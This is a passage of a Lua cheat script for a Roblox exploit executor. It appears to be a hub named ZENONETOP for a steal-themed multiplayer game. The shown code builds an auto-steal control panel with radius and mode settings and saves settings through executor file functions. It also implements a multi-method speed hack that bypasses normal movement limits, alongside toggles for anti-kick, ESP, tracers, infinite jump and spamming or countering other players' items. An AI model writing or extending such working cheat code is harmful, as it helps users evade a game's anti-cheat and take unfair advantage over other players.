	local radiusLbl = Instance.new("TextLabel", body)
	radiusLbl.Size = UDim2.new(0.45, 0, 0, 16)
	radiusLbl.Position = UDim2.new(0.55, 0, 0, 3)
	radiusLbl.BackgroundTransparency = 1
	radiusLbl.Text = "Radius: 60"
	radiusLbl.TextColor3 = COL.dim
	radiusLbl.Font = Enum.Font.GothamBold
	radiusLbl.TextSize = 11
	radiusLbl.TextXAlignment = Enum.TextXAlignment.Right
	radiusLbl.ZIndex = 62

	local barBg = Instance.new("Frame", body)
	barBg.Size = UDim2.new(1, 0, 0, 14)
	barBg.Position = UDim2.fromOffset(0, 26)
	barBg.BackgroundColor3 = COL.barBg
	barBg.BorderSizePixel = 0
	barBg.ZIndex = 62
	corner(barBg, 6)
	local barFill = Instance.new("Frame", barBg)
	barFill.Size = UDim2.new(0, 0, 1, 0)
	barFill.BackgroundColor3 = Color3.fromRGB(100, 255, 160)
	barFill.BorderSizePixel = 0
	barFill.ZIndex = 63
	corner(barFill, 6)
	local barGrad = Instance.new("UIGradient", barFill)
	barGrad.Color = ColorSequence.new({
 ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 220, 140)),
 ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 255, 210)),
	})

	local expandPanel = Instance.new("Frame", main)
	expandPanel.Size = UDim2.new(1, -16, 0, 130)
	expandPanel.Position = UDim2.fromOffset(8, 78)
	expandPanel.BackgroundTransparency = 1
	expandPanel.ZIndex = 61
	expandPanel.Visible = saved.expanded == true

	local radTitle = Instance.new("TextLabel", expandPanel)
	radTitle.Size = UDim2.new(1,0,0,14)
	radTitle.BackgroundTransparency = 1
	radTitle.Text = "Radius (studs)"
	radTitle.TextColor3 = COL.white
	radTitle.Font = Enum.Font.GothamBold
	radTitle.TextSize = 10
	radTitle.TextXAlignment = Enum.TextXAlignment.Left
	radTitle.ZIndex = 62

	local radBox = Instance.new("TextBox", expandPanel)
	radBox.Size = UDim2.new(0, 70, 0, 24)
	radBox.Position = UDim2.fromOffset(0, 18)
	radBox.BackgroundColor3 = COL.row
	radBox.BorderSizePixel = 0
	radBox.Text = tostring(math.floor(autoStealRadius))
	radBox.TextColor3 = COL.white
	radBox.Font = Enum.Font.GothamBold
	radBox.TextSize = 12
	radBox.ClearTextOnFocus = false
	radBox.ZIndex = 63
	corner(radBox, 6)

	local radMinus = Instance.new("TextButton", expandPanel)
	radMinus.Size = UDim2.fromOffset(28, 24)
	radMinus.Position = UDim2.fromOffset(78, 18)
	radMinus.BackgroundColor3 = COL.row
	radMinus.Text = "−"
	radMinus.TextColor3 = COL.white
	radMinus.Font = Enum.Font.GothamBold
	radMinus.TextSize = 14
	radMinus.ZIndex = 63
	corner(radMinus, 6)

	local radPlus = Instance.new("TextButton", expandPanel)
	radPlus.Size = UDim2.fromOffset(28, 24)
	radPlus.Position = UDim2.fromOffset(110, 18)
	radPlus.BackgroundColor3 = COL.row
	radPlus.Text = "+"
	radPlus.TextColor3 = COL.white
	radPlus.Font = Enum.Font.GothamBold
	radPlus.TextSize = 14
	radPlus.ZIndex = 63
	corner(radPlus, 6)

	local bgTitle = Instance.new("TextLabel", expandPanel)
	bgTitle.Size = UDim2.new(1,0,0,14)
	bgTitle.Position = UDim2.fromOffset(0, 48)
	bgTitle.BackgroundTransparency = 1
	bgTitle.Text = "Background #1/" .. tostring(#BackgroundIDs)
	bgTitle.TextColor3 = COL.white
	bgTitle.Font = Enum.Font.GothamBold
	bgTitle.TextSize = 10
	bgTitle.TextXAlignment = Enum.TextXAlignment.Left
	bgTitle.ZIndex = 62

	local bgPrev = Instance.new("TextButton", expandPanel)
	bgPrev.Size = UDim2.fromOffset(40, 24)
	bgPrev.Position = UDim2.fromOffset(0, 66)
	bgPrev.BackgroundColor3 = COL.row
	bgPrev.Text = "◀"
	bgPrev.TextColor3 = COL.white
	bgPrev.Font = Enum.Font.GothamBold
	bgPrev.TextSize = 12
	bgPrev.ZIndex = 63
	corner(bgPrev, 6)

	local bgNext = Instance.new("TextButton", expandPanel)
	bgNext.Size = UDim2.fromOffset(40, 24)
	bgNext.Position = UDim2.fromOffset(46, 66)
	bgNext.BackgroundColor3 = COL.row
	bgNext.Text = "▶"
	bgNext.TextColor3 = COL.white
	bgNext.Font = Enum.Font.GothamBold
	bgNext.TextSize = 12
	bgNext.ZIndex = 63
	corner(bgNext, 6)

	local scaleTitle = Instance.new("TextLabel", expandPanel)
	scaleTitle.Size = UDim2.new(0, 80, 0, 14)
	scaleTitle.Position = UDim2.fromOffset(100, 50)
	scaleTitle.BackgroundTransparency = 1
	scaleTitle.Text = "Size GUI"
	scaleTitle.TextColor3 = COL.dim
	scaleTitle.Font = Enum.Font.GothamBold
	scaleTitle.TextSize = 10
	scaleTitle.TextXAlignment = Enum.TextXAlignment.Left
	scaleTitle.ZIndex = 62

	local scaleMinus = Instance.new("TextButton", expandPanel)
	scaleMinus.Size = UDim2.fromOffset(36, 24)
	scaleMinus.Position = UDim2.fromOffset(100, 66)
	scaleMinus.BackgroundColor3 = COL.row
	scaleMinus.Text = "−"
	scaleMinus.TextColor3 = COL.white
	scaleMinus.Font = Enum.Font.GothamBold
	scaleMinus.TextSize = 16
	scaleMinus.ZIndex = 63
	corner(scaleMinus, 6)

	local scalePlus = Instance.new("TextButton", expandPanel)
	scalePlus.Size = UDim2.fromOffset(36, 24)
	scalePlus.Position = UDim2.fromOffset(142, 66)
	scalePlus.BackgroundColor3 = COL.row
	scalePlus.Text = "+"
	scalePlus.TextColor3 = COL.white
	scalePlus.Font = Enum.Font.GothamBold
	scalePlus.TextSize = 16
	scalePlus.ZIndex = 63
	corner(scalePlus, 6)

	local scaleVal = Instance.new("TextLabel", expandPanel)
	scaleVal.Size = UDim2.fromOffset(48, 24)
	scaleVal.Position = UDim2.fromOffset(184, 66)
	scaleVal.BackgroundTransparency = 1
	scaleVal.Text = string.format("%.0f%%", (saved.scale or 1) * 100)
	scaleVal.TextColor3 = COL.white
	scaleVal.Font = Enum.Font.GothamBold
	scaleVal.TextSize = 12
	scaleVal.ZIndex = 62

	local function applyBg(idx)
 saved.bgIndex = math.clamp(tonumber(idx) or 1, 1, #BackgroundIDs)
 bgImg.Image = "rbxassetid://" .. BackgroundIDs[saved.bgIndex]
 bgTitle.Text = "Background #" .. saved.bgIndex .. "/" .. #BackgroundIDs
 saveVAS()
	end

	local function setRadius(v)
 v = math.clamp(math.floor(tonumber(v) or 60), 1, 500)
 autoStealRadius = v
 _G.AceStealRadii = _G.AceStealRadii or {}
 if selectedStealMode == "Normal" or selectedStealMode == "V1" then
 _G.AceStealRadii.Normal = v
 elseif selectedStealMode == "V3" then
 _G.AceStealRadii.V3 = v
 else
 _G.AceStealRadii.Semi = v
 end
 if _G.AceNormalAutoStealSetRadius then pcall(_G.AceNormalAutoStealSetRadius, v) end
 if _G.AceSemiSteal then _G.AceSemiSteal.radius = v end
 radBox.Text = tostring(v)
 radiusLbl.Text = "Radius: " .. tostring(v)
 saveVAS()
	end

	local function currentMode()
 if selectedStealMode == "Semi" then
 return (autoStealV2Version == "V2") and "V3" or "V2"
 end
 if selectedStealMode == "V3" then return "V3" end
 return "V1"
	end

	local function applyMode(mode)
 _G.AceStealRadii = _G.AceStealRadii or { Normal = 60, Semi = 9, V3 = 60 }
 if mode == "V1" then
 selectedStealMode = "Normal"
 autoStealRadius = _G.AceStealRadii.Normal or 60
 elseif mode == "V2" then
 selectedStealMode = "Semi"
 autoStealV2Version = "V1"
 autoStealRadius = _G.AceStealRadii.Semi or 9
 else
 selectedStealMode = "Semi"
 autoStealV2Version = "V2"
 autoStealRadius = _G.AceStealRadii.Semi or _G.AceStealRadii.V3 or 9
 end
 setRadius(autoStealRadius)
 if autoStealEnabled and _G.AceAutoStealSync then
 pcall(_G.AceAutoStealSync)
 end
 saveVAS()
	end

	local function styleModes()
 local cur = currentMode()
 for n,b in pairs(modeBtns) do
 local on = (n == cur)
 b.BackgroundColor3 = on and Color3.fromRGB(240,240,245) or COL.row
 b.TextColor3 = on and Color3.fromRGB(10,10,12) or COL.white
 end
	end

	local function refreshUI()
 local on = autoStealEnabled == true
 onBtn.Text = on and "ON" or "OFF"
 onBtn.BackgroundColor3 = on and COL.greenBg or COL.off
 onBtn.TextColor3 = on and COL.green or COL.white
 radiusLbl.Text = "Radius: " .. tostring(math.floor(tonumber(autoStealRadius) or 60))
 styleModes()
	end

	local function setStealOn(state)
 autoStealEnabled = state and true or false
 _G.autoStealEnabled = autoStealEnabled
 -- ensure setups exist
 pcall(function()
 if _G.__AceSetupNormalAutoSteal then _G.__AceSetupNormalAutoSteal() end
 end)
 pcall(function()
 if _G.__AceSetupSemiAutoSteal then _G.__AceSetupSemiAutoSteal() end
 end)
 if _G.AceAutoStealSync then
 local ok, err = pcall(_G.AceAutoStealSync)
 if not ok then warn("[AutoSteal] Sync error:", err) end
 else
 warn("[AutoSteal] AceAutoStealSync missing")
 end
 -- force start if still not
 if autoStealEnabled then
 local mode = selectedStealMode
 if mode == "Normal" or mode == "V1" then
 if _G.AceNormalAutoStealStart then pcall(_G.AceNormalAutoStealStart) end
 elseif mode == "Semi" or mode == "V2" or mode == "V3" then
 -- V3 UI = Semi Version2
 if mode == "V3" then
 selectedStealMode = "Semi"
 autoStealV2Version = "V2"
 end
 if _G.AceSemiAutoStealStart then pcall(_G.AceSemiAutoStealStart) end
 end
 end
 refreshUI()
 saveVAS()
 print("[AutoSteal] ON=", autoStealEnabled, "mode=", selectedStealMode, "radius=", autoStealRadius)
	end

	onBtn.MouseButton1Click:Connect(function() setStealOn(not autoStealEnabled) end)
	for name,b in pairs(modeBtns) do
 b.MouseButton1Click:Connect(function() applyMode(name); refreshUI() end)
	end
	expBtn.MouseButton1Click:Connect(function()
 saved.expanded = not saved.expanded
 expandPanel.Visible = saved.expanded
 main.Size = UDim2.fromOffset(BASE_W, saved.expanded and BASE_H_EXP or BASE_H)
 expBtn.Text = saved.expanded and "−" or "+"
 saveVAS()
	end)
	lockBtn.MouseButton1Click:Connect(function()
 saved.locked = not saved.locked
 lockBtn.Text = saved.locked and "🔒" or "🔓"
 saveVAS()
	end)
	radBox.FocusLost:Connect(function() setRadius(radBox.Text) end)
	radMinus.MouseButton1Click:Connect(function() setRadius((tonumber(autoStealRadius) or 60) - 1) end)
	radPlus.MouseButton1Click:Connect(function() setRadius((tonumber(autoStealRadius) or 60) + 1) end)
	bgPrev.MouseButton1Click:Connect(function() applyBg(saved.bgIndex - 1) end)
	bgNext.MouseButton1Click:Connect(function() applyBg(saved.bgIndex + 1) end)
	scaleMinus.MouseButton1Click:Connect(function()
 saved.scale = math.clamp((saved.scale or 1) - 0.1, 0.5, 2.5)
 uiScale.Scale = saved.scale
 scaleVal.Text = string.format("%.0f%%", saved.scale * 100)
 saveVAS()
	end)
	scalePlus.MouseButton1Click:Connect(function()
 saved.scale = math.clamp((saved.scale or 1) + 0.1, 0.5, 2.5)
 uiScale.Scale = saved.scale
 scaleVal.Text = string.format("%.0f%%", saved.scale * 100)
 saveVAS()
	end)

	RunService.RenderStepped:Connect(function()
 local p = math.clamp(tonumber(_G.AceStealBarProgress) or 0, 0, 1)
 barFill.Size = UDim2.new(p, 0, 1, 0)
 radiusLbl.Text = "Radius: " .. tostring(math.floor(tonumber(autoStealRadius) or 60))
 local pct = math.floor(p * 100 + 0.5)
 if p > 0.005 then
 statusLbl.Text = string.format("%d%%", pct)
 statusLbl.TextSize = 22
 statusLbl.Font = Enum.Font.GothamBlack
 if pct >= 100 then
 statusLbl.TextColor3 = Color3.fromRGB(120, 255, 160)
 elseif pct >= 75 then
 statusLbl.TextColor3 = Color3.fromRGB(255, 230, 100)
 else
 statusLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
 end
 statusLbl.TextStrokeTransparency = 0.15
 else
 statusLbl.Text = autoStealEnabled and "READY" or "IDLE"
 statusLbl.TextSize = 16
 statusLbl.Font = Enum.Font.GothamBold
 statusLbl.TextColor3 = autoStealEnabled and Color3.fromRGB(140, 255, 180) or COL.dim
 statusLbl.TextStrokeTransparency = 0.35
 end
	end)

	do
 local dragging, start, startPos = false, nil, nil
 local function begin(input)
 if saved.locked then return end
 if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 dragging = true; start = input.Position; startPos = main.Position
 end
 end
 header.InputBegan:Connect(begin)
 main.InputBegan:Connect(begin)
 UserInputService.InputChanged:Connect(function(input)
 if not dragging or saved.locked then return end
 if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
 local d = input.Position - start
 main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
 end
 end)
 UserInputService.InputEnded:Connect(function(input)
 if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 if dragging then dragging = false; saveVAS() end
 end
 end)
	end

	-- Restore mode + ON/OFF đã lưu
	pcall(function()
 if saved.mode == "V2" then
 selectedStealMode = "Semi"
 autoStealV2Version = "V1"
 elseif saved.mode == "V3" then
 selectedStealMode = "Semi"
 autoStealV2Version = "V2"
 else
 selectedStealMode = "Normal"
 end
 setRadius(autoStealRadius)
	end)
	refreshUI()
	applyBg(saved.bgIndex)
	if saved.enabled then
 task.defer(function()
 pcall(function() setStealOn(true) end)
 end)
	end
	print("[AutoSteal] GUI ready — mode=", saved.mode, "enabled=", saved.enabled, "scale=", saved.scale)
end)
]==])
	end
end)

local St = {
	antiGummy = true, antiRagdoll = false, antiPaint = true, antiBoogie = true,
	toolAim = true, speedOn = true, infJump = true, bodyLock = false, bodyLockRange = 20,
	activeMode = "Normal",
	modes = {
 Normal = { norm = 59, steal = 30, key = Enum.KeyCode.T },
 Lagger = { norm = 18, steal = 24, key = Enum.KeyCode.Q },
 Custom = { norm = 33, steal = 33, key = Enum.KeyCode.C },
	},
	dropMode = 2, -- 1 Stand/Fling, 2 Jump
	instaMode = "V1",
	mobileBtns = true, guiLock = false, -- default ON: Drop / Insta / TP buttons
	showStealBtn = true, showLaggerPanel = false, showPingLaggerPanel = false, showSpeedBypassPanel = false, speedBypassLock = false, panelGuiScale = 0.7, panelGuiWidth = 1, laggerPanelLock = false, pingPanelLock = false, -- hiện nút Auto Steal ngoài (độc lập auto steal on/off)
	btnShape = "Square", -- Round | Box | Square
	btnScale = 0.75,
	menuScale = 1.0,
	btnSizes = { mode = 50, drop = 50, insta = 50, tp = 50, sentry = 50, steal = 50 },
	keys = {
 Drop = Enum.KeyCode.X,
 TPDown = Enum.KeyCode.F,
 InstaReset = Enum.KeyCode.Z,
 DestroySentry = Enum.KeyCode.H,
 AutoSteal = nil, -- nil = None (no key)
	},
	esp = false, tracer = false, antiLag = false,
	antiKick = true, wallOpacity = 0.12, speedMethod = "Velocity",
	destroySentry = false,
	spamLaser = false, spamPaint = false,
	counterLaser = false, counterBoogie = false, counterSwapBody = false,
	equipOnDrop = false,
}
local ToggleRefs = {} -- để Reset All cập nhật UI

local CFG = "ZenonetopAllgear.json"
local _saveToken = 0
function autoSaveDebounced()
	_saveToken = _saveToken + 1
	local t = _saveToken
	task.delay(0.35, function()
 if t == _saveToken then pcall(saveCfg) end
	end)
end
function _serializeValue(v, depth)
	depth = depth or 0
	if depth > 6 then return nil end
	local t = typeof(v)
	if t == "number" or t == "string" or t == "boolean" then
 return v
	elseif t == "EnumItem" then
 return v.Name
	elseif t == "table" then
 local out = {}
 for k2, v2 in pairs(v) do
 local kt = type(k2)
 if kt == "string" or kt == "number" then
 local sv = _serializeValue(v2, depth + 1)
 if sv ~= nil then out[k2] = sv end
 end
 end
 return out
	end
	return nil
end
function saveCfg()
	local d = {}
	-- dump TOÀN BỘ St (mọi key có thể JSON được)
	for k, v in pairs(St) do
 if type(k) == "string" then
 -- không lưu base/pet TP — chỉ nhớ vị trí panel
 if k == "_saveBase" or k == "_savePet" or k == "saveBase" or k == "savePet"
 or k == "_delayBase" or k == "_delayPet" then
 -- skip
 elseif k == "modes" or k == "keys" then
 -- skip, handle below
 else
 local sv = _serializeValue(v)
 if sv ~= nil then d[k] = sv end
 end
 end
	end
	d.modes = {}
	for k, m in pairs(St.modes or {}) do
 if type(m) == "table" then
 d.modes[k] = {
 norm = tonumber(m.norm) or 16,
 steal = tonumber(m.steal) or 16,
 key = (typeof(m.key) == "EnumItem" and m.key.Name) or (type(m.key) == "string" and m.key) or "Unknown",
 }
 end
	end
	d.keys = {}
	for k, v in pairs(St.keys or {}) do
 d.keys[k] = (typeof(v) == "EnumItem" and v.Name) or tostring(v)
	end
	local ok, err = pcall(function()
 if not writefile then error("no writefile") end
 d._saveBase = nil
	d._savePet = nil
	d.saveBase = nil
	d.savePet = nil
	d._delayBase = nil
	d._delayPet = nil
	writefile(CFG, HttpService:JSONEncode(d))
	end)
	if not ok then
 warn("[ZENONETOP] saveCfg fail:", err)
	end
	return ok
end
function loadCfg()
	local ok, data = pcall(function()
 if isfile and readfile then
 if isfile(CFG) then
 return HttpService:JSONDecode(readfile(CFG))
 end
 for _, old in ipairs({"RaraOnflop.json", "ZenonetopHub_FullMenu_v1.json", "ZenonetopHub_Config.json", "ZENONETOP.json"}) do
 if isfile(old) then
 local d = HttpService:JSONDecode(readfile(old))
 pcall(function() writefile(CFG, HttpService:JSONEncode(d)) end)
 return d
 end
 end
 end
	end)
	if not (ok and type(data) == "table") then return false end
	for k, v in pairs(data) do
 if type(k) == "string" and k ~= "modes" and k ~= "keys" then
 St[k] = v
 end
	end
	if type(data.modes) == "table" then
 for k, m in pairs(data.modes) do
 if type(m) == "table" then
 St.modes[k] = St.modes[k] or { norm = 59, steal = 30, key = Enum.KeyCode.Unknown }
 St.modes[k].norm = tonumber(m.norm) or St.modes[k].norm
 St.modes[k].steal = tonumber(m.steal) or St.modes[k].steal
 if type(m.key) == "string" then
 pcall(function() St.modes[k].key = Enum.KeyCode[m.key] end)
 end
 end
 end
	end
	if type(data.keys) == "table" then
 St.keys = St.keys or {}
 for k, name in pairs(data.keys) do
 pcall(function() St.keys[k] = Enum.KeyCode[name] end)
 end
	end
	if type(data.btnSizes) == "table" then
 St.btnSizes = data.btnSizes
 for k,v in pairs(St.btnSizes) do
 St.btnSizes[k] = math.clamp(tonumber(v) or 50, 20, 200)
 end
	end
	if type(data._btnPos) == "table" then St._btnPos = data._btnPos end
	St.stealRadius = tonumber(St.stealRadius) or 60
	St.stealVer = St.stealVer or "V1"
	St.stealBarScale = tonumber(St.stealBarScale) or 1
	if St.showStealBtn == nil then St.showStealBtn = true end
	autoStealRadius = St.stealRadius
	return true
end
loadCfg()
task.spawn(function()
	while true do
 task.wait(3)
 local ok, err = pcall(saveCfg)
 if not ok then warn("[ZENONETOP] autosave 3s fail:", err) end
	end
end)

----------------------------------------------------------------
----------------------------------------------------------------
-- SPEED — full Empire multi-method loop (Velocity / LV / CFrame / ...)
----------------------------------------------------------------
local speedConnection = nil
local currentSpeedValue = 16
St.speedMethod = St.speedMethod or "Velocity"
St.hyperMult = tonumber(St.hyperMult) or 4

local _spd = {
	lastMethod = nil,
	lastMoveDir = Vector3.zero,
	anchoredBySpeed = nil,
	bodyVel = nil, bodyPosition = nil, bodyForce = nil, bodyThrust = nil,
	linearVel = nil, vectorForce = nil, alignPos = nil,
	rocket = nil, rocketTarget = nil,
	attLinVel = nil, attVecForce = nil, attAlign = nil,
	speedTween = nil,
}

local MOVE_KEYS = {
	[Enum.KeyCode.W] = true, [Enum.KeyCode.A] = true, [Enum.KeyCode.S] = true, [Enum.KeyCode.D] = true,
	[Enum.KeyCode.Up] = true, [Enum.KeyCode.Down] = true, [Enum.KeyCode.Left] = true, [Enum.KeyCode.Right] = true,
}

function getCharParts()
	local char = LP.Character
	if not char then return nil, nil end
	local hum = char:FindFirstChildOfClass("Humanoid")
	local root = char:FindFirstChild("HumanoidRootPart")
	if not hum or not root then return nil, nil end
	return hum, root
end


----------------------------------------------------------------
-- SPEED LOOP + INF JUMP — FULL EMPIRE (fetched) — no old leftovers
-- 3 mode (Normal/Lagger/Custom) = St.modes + getActiveMoveSpeed
----------------------------------------------------------------
_spd = _spd or {
	lastMethod = nil,
	lastMoveDir = Vector3.zero,
	anchoredBySpeed = nil,
	bodyVel = nil, bodyPosition = nil, bodyForce = nil, bodyThrust = nil,
	linearVel = nil, vectorForce = nil, alignPos = nil,
	rocket = nil, rocketTarget = nil,
	attLinVel = nil, attVecForce = nil, attAlign = nil,
	speedTween = nil,
}
speedConnection = nil
currentSpeedValue = 16

function isCarryingBrainrot(char)
	if not char then return false end
	local ok, st = pcall(function() return LP:GetAttribute("Stealing") end)
	if ok and st == true then return true end
	local ok2, st2 = pcall(function() return char:GetAttribute("Stealing") end)
	if ok2 and st2 == true then return true end
	for _, v in ipairs(char:GetChildren()) do
 if v:IsA("Tool") or v:IsA("Model") or v:IsA("Folder") then
 local n = string.lower(tostring(v.Name))
 if n:find("brainrot", 1, true) or n:find("carriedbrain", 1, true) then
 return true
 end
 end
	end
	return false
end

function getActiveMoveSpeed()
	-- 3 mode speed: Normal / Lagger / Custom (UI + V2 bar)
	local mode = St.activeMode
	if not mode or not St.modes[mode] then
 mode = "Normal"
 St.activeMode = "Normal"
	end
	local m = St.modes[mode] or { norm = 59, steal = 30 }
	local norm = math.clamp(tonumber(m.norm) or 59, 1, 200)
	local steal = math.clamp(tonumber(m.steal) or 30, 1, 200)
	if isCarryingBrainrot(LP.Character) then
 return steal
	end
	return norm
end

function ensureSpeedAttachment(hrp, key, name)
	local att = _spd[key]
	if not att or att.Parent ~= hrp then
 if att then pcall(function() att:Destroy() end) end
 att = Instance.new("Attachment")
 att.Name = name or "ZenonetopEmpireSpeedAtt"
 att.Parent = hrp
 _spd[key] = att
	end
	return att
end

function destroySpeedObjects() if _spd.anchoredBySpeed then pcall(function() _spd.anchoredBySpeed.Anchored = false end); _spd.anchoredBySpeed = nil end if _spd.bodyVel then pcall(function() _spd.bodyVel:Destroy() end); _spd.bodyVel = nil end if _spd.bodyPosition then pcall(function() _spd.bodyPosition:Destroy() end); _spd.bodyPosition = nil end if _spd.bodyForce then pcall(function() _spd.bodyForce:Destroy() end); _spd.bodyForce = nil end if _spd.bodyThrust then pcall(function() _spd.bodyThrust:Destroy() end); _spd.bodyThrust = nil end if _spd.linearVel then pcall(function() _spd.linearVel:Destroy() end); _spd.linearVel = nil end if _spd.vectorForce then pcall(function() _spd.vectorForce:Destroy() end); _spd.vectorForce = nil end if _spd.alignPos then pcall(function() _spd.alignPos:Destroy() end); _spd.alignPos = nil end if _spd.rocket then pcall(function() _spd.rocket:Destroy() end); _spd.rocket = nil end if _spd.rocketTarget then pcall(function() _spd.rocketTarget:Destroy() end); _spd.rocketTarget = nil end if _spd.attLinVel then pcall(function() _spd.attLinVel:Destroy() end); _spd.attLinVel = nil end if _spd.attVecForce then pcall(function() _spd.attVecForce:Destroy() end); _spd.attVecForce = nil end if _spd.attAlign then pcall(function() _spd.attAlign:Destroy() end); _spd.attAlign = nil end if _spd.speedTween then pcall(function() _spd.speedTween:Cancel() end); _spd.speedTween = nil end end function applySpeedMethod(hrp, hum, dir, spd, dt) local step = dt or 1/60 local m = (St.speedMethod or "Velocity") if _spd.lastMethod ~= m then destroySpeedObjects() if m ~= "WalkSpeed" and hum.WalkSpeed ~= 16 then hum.WalkSpeed = 16 end _spd.lastMethod = m end local char = hrp.Parent local targetPos = hrp.Position + (dir * spd * step) local function massImpulse(direction, targetSpeed) local mass = hrp.AssemblyMass or 1 local current = hrp.AssemblyLinearVelocity local desired = Vector3.new(direction.X * targetSpeed, current.Y, direction.Z * targetSpeed) local delta = desired - current pcall(function() hrp:ApplyImpulse(Vector3.new(delta.X, 0, delta.Z) * mass) end) end if m == "Velocity" then massImpulse(dir, spd) elseif m == "AssemblyLinearVelocity" then massImpulse(dir, spd) elseif m == "Velocity Lerp" then local current = hrp.AssemblyLinearVelocity local desired = Vector3.new(dir.X*spd, current.Y, dir.Z*spd) local blended = current:Lerp(desired, 0.6) local mass = hrp.AssemblyMass or 1 pcall(function() hrp:ApplyImpulse(Vector3.new(blended.X - current.X, 0, blended.Z - current.Z) * mass) end) elseif m == "AssemblyLinearVelocity Lerp" then local current = hrp.AssemblyLinearVelocity local desired = Vector3.new(dir.X*spd, current.Y, dir.Z*spd) local blended = current:Lerp(desired, 0.6) local mass = hrp.AssemblyMass or 1 pcall(function() hrp:ApplyImpulse(Vector3.new(blended.X - current.X, 0, blended.Z - current.Z) * mass) end) elseif m == "CFrame" then hrp.CFrame = hrp.CFrame + (dir * spd * step) elseif m == "CFrame Lerp" then hrp.CFrame = hrp.CFrame:Lerp(hrp.CFrame + (dir * spd * step), 0.5) elseif m == "Hyper CFrame" then hrp.CFrame = hrp.CFrame + (dir * spd * ((St.hyperMult or 4) or 4) * step) elseif m == "Anchored CFrame" then if not hrp.Anchored then hrp.Anchored = true _spd.anchoredBySpeed = hrp end hrp.CFrame = hrp.CFrame + (dir * spd * step) elseif m == "PivotTo" then hrp:PivotTo(hrp.CFrame + (dir * spd * step)) elseif m == "Model PivotTo" then if char and char:IsA("Model") then char:PivotTo(char:GetPivot() + (dir * spd * step)) else hrp:PivotTo(hrp.CFrame + (dir * spd * step)) end elseif m == "Tween CFrame" then if _spd.speedTween then pcall(function() _spd.speedTween:Cancel() end) end _spd.speedTween = TS:Create(hrp, TweenInfo.new(step, Enum.EasingStyle.Linear), {CFrame = hrp.CFrame + (dir * spd * step)}) _spd.speedTween:Play() elseif m == "WalkSpeed" then hum.WalkSpeed = spd elseif m == "Humanoid Move" then hum.WalkSpeed = spd hum:Move(dir) elseif m == "Humanoid MoveTo" then hum:MoveTo(targetPos, hrp) elseif m == "BodyVelocity" then if not _spd.bodyVel or _spd.bodyVel.Parent ~= hrp then if _spd.bodyVel then pcall(function() _spd.bodyVel:Destroy() end) end _spd.bodyVel = Instance.new("BodyVelocity") _spd.bodyVel.MaxForce = Vector3.new(math.huge, math.huge, math.huge) _spd.bodyVel.Parent = hrp end _spd.bodyVel.Velocity = Vector3.new(dir.X*spd, _spd.bodyVel.Velocity.Y, dir.Z*spd) elseif m == "BodyPosition" then if not _spd.bodyPosition or _spd.bodyPosition.Parent ~= hrp then if _spd.bodyPosition then pcall(function() _spd.bodyPosition:Destroy() end) end _spd.bodyPosition = Instance.new("BodyPosition") _spd.bodyPosition.MaxForce = Vector3.new(math.huge, math.huge, math.huge) _spd.bodyPosition.P = 500 _spd.bodyPosition.D = 50 _spd.bodyPosition.Parent = hrp end _spd.bodyPosition.Position = targetPos elseif m == "BodyForce" then if not _spd.bodyForce or _spd.bodyForce.Parent ~= hrp then if _spd.bodyForce then pcall(function() _spd.bodyForce:Destroy() end) end _spd.bodyForce = Instance.new("BodyForce") _spd.bodyForce.Parent = hrp end _spd.bodyForce.Force = Vector3.new(dir.X*spd, 0, dir.Z*spd) * 100 elseif m == "BodyThrust" then if not _spd.bodyThrust or _spd.bodyThrust.Parent ~= hrp then if _spd.bodyThrust then pcall(function() _spd.bodyThrust:Destroy() end) end _spd.bodyThrust = Instance.new("BodyThrust") _spd.bodyThrust.Force = Vector3.new(math.huge, math.huge, math.huge) _spd.bodyThrust.Parent = hrp end _spd.bodyThrust.Force = Vector3.new(dir.X*spd, 0, dir.Z*spd) * 100 elseif m == "LinearVelocity" then if not _spd.linearVel or _spd.linearVel.Parent ~= hrp then if _spd.linearVel then pcall(function() _spd.linearVel:Destroy() end) end local att = ensureSpeedAttachment(hrp, "attLinVel", "MoveeLinVelAtt") _spd.linearVel = Instance.new("LinearVelocity") _spd.linearVel.Attachment0 = att _spd.linearVel.MaxForce = 1e8 _spd.linearVel.RelativeTo = Enum.ActuatorRelativeTo.World _spd.linearVel.Parent = hrp end _spd.linearVel.VectorVelocity = Vector3.new(dir.X*spd, _spd.linearVel.VectorVelocity.Y, dir.Z*spd) elseif m == "VectorForce" then if not _spd.vectorForce or _spd.vectorForce.Parent ~= hrp then if _spd.vectorForce then pcall(function() _spd.vectorForce:Destroy() end) end local att = ensureSpeedAttachment(hrp, "attVecForce", "MoveeVecForceAtt") _spd.vectorForce = Instance.new("VectorForce") _spd.vectorForce.Attachment0 = att _spd.vectorForce.RelativeTo = Enum.ActuatorRelativeTo.World _spd.vectorForce.Parent = hrp end _spd.vectorForce.Force = Vector3.new(dir.X*spd, 0, dir.Z*spd) * 100 elseif m == "AlignPosition" then if not _spd.alignPos or _spd.alignPos.Parent ~= hrp then if _spd.alignPos then pcall(function() _spd.alignPos:Destroy() end) end local att = ensureSpeedAttachment(hrp, "attAlign", "MoveeAlignAtt") _spd.alignPos = Instance.new("AlignPosition") _spd.alignPos.Attachment0 = att _spd.alignPos.Mode = Enum.PositionAlignmentMode.OneAttachment _spd.alignPos.MaxForce = math.huge _spd.alignPos.Responsiveness = 15 _spd.alignPos.RigidityEnabled = false _spd.alignPos.Parent = hrp end _spd.alignPos.Position = targetPos elseif m == "ApplyImpulse" then local mass = hrp.AssemblyMass or 1 local current = hrp.AssemblyLinearVelocity local desired = Vector3.new(dir.X * spd, current.Y, dir.Z * spd) local delta = desired - current pcall(function() hrp:ApplyImpulse(Vector3.new(delta.X, 0, delta.Z) * mass) end) elseif m == "RocketPropulsion" then if not _spd.rocket or _spd.rocket.Parent ~= hrp or not _spd.rocketTarget then if _spd.rocket then pcall(function() _spd.rocket:Destroy() end) end if _spd.rocketTarget then pcall(function() _spd.rocketTarget:Destroy() end) end _spd.rocketTarget = Instance.new("Part") _spd.rocketTarget.Name = "MoveeRocketTarget" _spd.rocketTarget.Anchored = true _spd.rocketTarget.CanCollide = false _spd.rocketTarget.Transparency = 1 _spd.rocketTarget.Size = Vector3.new(1,1,1) 